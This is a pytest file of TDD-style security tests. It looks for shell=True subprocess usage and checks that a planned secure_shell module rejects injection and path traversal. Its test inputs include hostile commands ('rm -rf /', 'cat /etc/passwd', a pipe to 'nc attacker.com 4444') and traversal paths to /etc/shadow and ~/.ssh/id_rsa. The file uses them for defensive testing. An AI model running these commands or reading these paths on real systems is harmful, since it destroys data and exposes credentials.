# -*- coding: utf-8 -*-
"""
Security tests for shell injection vulnerabilities.

These tests verify that the codebase is protected against shell injection attacks
and follows secure coding practices for subprocess execution.
"""

import ast
import os
import pytest
from pathlib import Path
from typing import List, Tuple


def find_shell_true_usage() -> List[Tuple[str, int]]:
    """
    Find all instances of subprocess.run with shell=True in the codebase.
    
    Returns:
        List of (file_path, line_number) tuples where shell=True is found
    """
    project_root = Path(__file__).parent.parent.parent
    vulnerable_locations = []
    
    # Search in src/ and tools/ directories
    for directory in ["src", "tools"]:
        search_dir = project_root / directory
        if not search_dir.exists():
            continue
            
        for py_file in search_dir.glob("**/*.py"):
            try:
                with open(py_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Search for shell=True usage (excluding comments and shell=False)
                lines = content.split('\n')
                for line_num, line in enumerate(lines, 1):
                    # Skip comment lines
                    stripped_line = line.strip()
                    if stripped_line.startswith('#'):
                        continue
                    
                    # Look for shell=True but not shell=False
                    if 'shell=True' in line and 'shell=False' not in line:
                        relative_path = str(py_file.relative_to(project_root))
                        vulnerable_locations.append((relative_path, line_num))
                        
            except (UnicodeDecodeError, IOError):
                continue
                
    return vulnerable_locations


def find_subprocess_calls() -> List[Tuple[str, int, str]]:
    """
    Find all subprocess calls in the codebase.
    
    Returns:
        List of (file_path, line_number, function_call) tuples
    """
    project_root = Path(__file__).parent.parent.parent
    subprocess_calls = []
    
    for directory in ["src", "tools"]:
        search_dir = project_root / directory
        if not search_dir.exists():
            continue
            
        for py_file in search_dir.glob("**/*.py"):
            try:
                with open(py_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                lines = content.split('\n')
                for line_num, line in enumerate(lines, 1):
                    if 'subprocess.' in line:
                        relative_path = str(py_file.relative_to(project_root))
                        subprocess_calls.append((relative_path, line_num, line.strip()))
                        
            except (UnicodeDecodeError, IOError):
                continue
                
    return subprocess_calls


class TestShellInjectionPrevention:
    """Test suite for shell injection vulnerability prevention."""
    
    def test_no_shell_true_usage(self):
        """
        🔴 RED TEST: Verify that shell=True is not used anywhere in the codebase.
        
        This test will FAIL initially because the current codebase contains
        shell=True usage in multiple files. This is by design (TDD Red phase).
        """
        vulnerable_files = find_shell_true_usage()
        
        if vulnerable_files:
            error_msg = "Found shell=True usage in the following locations:\n"
            for file_path, line_num in vulnerable_files:
                error_msg += f"  - {file_path}:{line_num}\n"
            error_msg += "\nThis is a critical security vulnerability that allows command injection!"
            
        # This assertion will fail initially (Red phase)
        assert len(vulnerable_files) == 0, error_msg
    
    def test_subprocess_calls_are_secure(self):
        """
        🔴 RED TEST: Verify that all subprocess calls use secure patterns.
        
        This test checks that subprocess calls use list arguments instead of
        string arguments and do not use shell=True.
        """
        subprocess_calls = find_subprocess_calls()
        insecure_patterns = []
        
        for file_path, line_num, line_content in subprocess_calls:
            # Check for shell=True
            if 'shell=True' in line_content:
                insecure_patterns.append(f"{file_path}:{line_num} - Uses shell=True: {line_content}")
            
            # Check for string commands (potential indicator of shell=True usage)
            if 'subprocess.run(' in line_content and '"' in line_content:
                # This is a heuristic - might have false positives
                if 'shell=True' in line_content:
                    insecure_patterns.append(f"{file_path}:{line_num} - String command with shell=True: {line_content}")
        
        if insecure_patterns:
            error_msg = "Found insecure subprocess patterns:\n"
            for pattern in insecure_patterns:
                error_msg += f"  - {pattern}\n"
                
        # This assertion will fail initially (Red phase)
        assert len(insecure_patterns) == 0, error_msg
    
    def test_command_injection_prevention(self):
        """
        🔴 RED TEST: Verify that command injection attacks are prevented.
        
        This test simulates malicious input to verify that the system
        properly validates and sanitizes commands.
        """
        # Import after ensuring the module exists
        project_root = Path(__file__).parent.parent.parent
        src_path = project_root / "src"
        
        # This will fail initially because we haven't implemented secure_shell.py yet
        try:
            import sys
            sys.path.insert(0, str(src_path))
            from secure_shell import safe_command_execution, SecurityError
            
            # Test malicious payloads
            malicious_inputs = [
                ["test", ";", "rm", "-rf", "/"],
                ["test", "&&", "cat", "/etc/passwd"],
                ["test", "|", "nc", "attacker.com", "4444"],
                "test; rm -rf /",  # String input should be rejected
            ]
            
            for malicious_input in malicious_inputs:
                with pytest.raises(SecurityError):
                    safe_command_execution(malicious_input)
                    
        except ImportError:
            # Expected to fail initially - secure_shell.py doesn't exist yet
            pytest.fail("secure_shell module not found - needs to be implemented")
    
    def test_path_traversal_prevention(self):
        """
        🔴 RED TEST: Verify that path traversal attacks are prevented.
        
        This test checks that file path inputs are properly validated
        to prevent access to files outside the project directory.
        """
        project_root = Path(__file__).parent.parent.parent
        src_path = project_root / "src"
        
        try:
            import sys
            sys.path.insert(0, str(src_path))
            from secure_shell import validate_file_path, SecurityError
            
            # Test malicious paths
            malicious_paths = [
                "../../../etc/passwd",
                "../../../../../../etc/shadow",
                "/etc/passwd",
                "~/.ssh/id_rsa",
                "\\..\\..\\windows\\system32\\cmd.exe",
            ]
            
            for malicious_path in malicious_paths:
                with pytest.raises(SecurityError):
                    validate_file_path(malicious_path)
                    
        except ImportError:
            # Expected to fail initially - secure functions don't exist yet
            pytest.fail("secure path validation functions not found - needs to be implemented")

    def test_error_information_disclosure_prevention(self):
        """
        🔴 RED TEST: Verify that error messages don't disclose sensitive system information.
        
        This test ensures that error messages don't leak file paths, system information,
        or other sensitive data that could aid an attacker.
        """
        # This test will be implemented after we have the secure error handling in place
        pytest.skip("Error handling security to be implemented in Green phase")


class TestSecurityInfrastructure:
    """Test suite for security infrastructure and monitoring."""
    
    def test_security_logging_exists(self):
        """
        🔴 RED TEST: Verify that security events are properly logged.
        
        This test checks that the system has proper security logging
        for audit trails and incident response.
        """
        pytest.skip("Security logging to be implemented in Green phase")
    
    def test_input_validation_functions_exist(self):
        """
        🔴 RED TEST: Verify that input validation functions exist and work correctly.
        
        This test checks that we have comprehensive input validation
        for all external inputs.
        """
        pytest.skip("Input validation framework to be implemented in Green phase")


if __name__ == "__main__":
    # Run the security tests
    pytest.main([__file__, "-v"])